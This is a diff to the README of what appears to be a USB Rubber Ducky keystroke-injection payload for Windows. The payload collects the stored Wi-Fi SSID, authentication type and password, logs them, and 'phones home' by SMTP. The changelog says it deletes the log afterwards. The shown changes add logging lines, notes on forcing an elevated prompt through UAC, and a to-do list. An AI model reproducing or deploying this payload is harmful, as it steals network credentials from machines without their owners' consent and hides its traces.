@@ -9,7 +9,7 @@
 ## Succesfully tested on;
 * Windows 10
 * Windows 8.1
-* Windows 7
+* Windows 7, requires UAC
 
 ## **Code**;
 ```
@@ -57,6 +57,10 @@ STRING del a
 ENTER
 REM --> Write all info to log
 STRING echo ssid: %a%>>log & echo type: %b%>>log & echo auth: %c%>>log & echo key: %d%>>log
+ENTER
+STRING echo If all variables are empty there was no wireless connection>>log
+ENTER
+STRING echo If only the key variable is empty the payload requires UAC>>log
 ENTER
 
 REM FASE 3: Phone home
@@ -112,7 +116,7 @@ ENTER
 - Added delay after sending SMTP message, to make sure the 'exit' and 'del log' are executed
 - The cmd prompt must be elevated to get any passwords.  If you change from using the WINDOWS r to using the search menu for "cmd" and pressing ctrl+shift+enter you can get a UAC prompt.  From there you'd need to alt+Y to get the elevated prompt. You can also use the run box but with the following command in Win7 and later:
 powershell Start-Process cmd -Verb runAs
-- **This is only true in some cases, for me personally it works without the elevated prompt on multiple systems.**
+- **This is only true for Windows 7 systems, use the code below.**
 ```
 REM FASE 1: Preparation
 DELAY 3000
@@ -129,3 +133,6 @@ DELAY 1000
 ALT y
 DELAY 500
 ```
+
+## To-do;
+* Add empty variable detection which replaces the empty variable with 'variable not obtained'
